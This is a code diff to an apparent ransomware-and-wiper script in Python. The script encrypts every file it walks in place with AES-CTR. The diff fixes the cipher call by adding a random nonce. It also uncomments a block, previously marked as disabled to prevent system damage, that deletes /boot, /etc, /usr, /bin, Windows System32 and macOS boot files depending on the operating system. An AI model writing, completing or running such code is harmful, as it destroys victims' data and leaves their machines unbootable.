@@ -76,22 +76,23 @@ else:
                 file_path = os.path.join(root, file)
                 with open(file_path, "rb") as file:
                     file_content = file.read()
-                cipher = Cipher(algorithms.AES(key), modes.CTR(), backend=default_backend())
+                nonce = os.urandom(16)
+                cipher = Cipher(algorithms.AES(key), modes.CTR(nonce=nonce), backend=default_backend())
                 encryptor = cipher.encryptor()
                 encrypted_content = encryptor.update(file_content) + encryptor.finalize()
                 with open(file_path, "wb") as file:
                     file.write(encrypted_content)
     # The following lines attempt to remove critical system files based on the detected OS,
     # but they are commented out here to prevent accidental execution and system damage.
-  #  if platform.system() == "Linux":
-  #      shutil.rmtree("/boot")
-  #      shutil.rmtree("/etc")
-  #      shutil.rmtree("/usr")
-  #      shutil.rmtree("/bin")
-  #  elif platform.system() == "Windows":
-  #      os.remove("C:\Windows\System32")
-  #  elif platform.system() == "Darwin":
-  #      shutil.rmtree("/System/Library/CoreServices/Boot")
-  #      shutil.rmtree("/etc")
-  #      shutil.rmtree("/usr")
-  #      shutil.rmtree("/bin")
+    if platform.system() == "Linux":
+        shutil.rmtree("/boot")
+        shutil.rmtree("/etc")
+        shutil.rmtree("/usr")
+        shutil.rmtree("/bin")
+    elif platform.system() == "Windows":
+        os.remove("C:\Windows\System32")
+    elif platform.system() == "Darwin":
+        shutil.rmtree("/System/Library/CoreServices/Boot")
+        shutil.rmtree("/etc")
+        shutil.rmtree("/usr")
+        shutil.rmtree("/bin")
